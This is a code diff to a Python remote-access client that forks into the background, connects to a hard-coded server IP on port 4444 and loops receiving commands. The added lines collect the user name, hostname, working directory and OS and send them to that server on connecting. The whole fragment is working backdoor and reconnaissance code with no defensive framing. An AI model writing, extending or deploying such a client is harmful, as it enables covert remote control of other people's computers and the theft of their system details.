@@ -3,6 +3,9 @@ import subprocess
 import os
 import sys
 import time
+import json
+import getpass
+import platform
 
 def daemonize():
     #run client in the background by forking the process
@@ -32,6 +35,16 @@ def connect_to_server():
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client.connect(('192.168.232.133',4444)) # replace with server ip
             print(f"[*] connected to server")
+            # Get client information on startup
+            identity = {
+            	"user": getpass.getuser(),
+            	"hostname": socket.gethostname(),
+            	"cwd": os.getcwd(),
+            	"os": platform.system()
+            }
+            # send the identity data
+            client.send(json.dumps(identity).encode("utf-8"))
+            
             while True:
                 # receive command from server
                 command = client.recv(4096).decode('utf-8', errors='ignore')
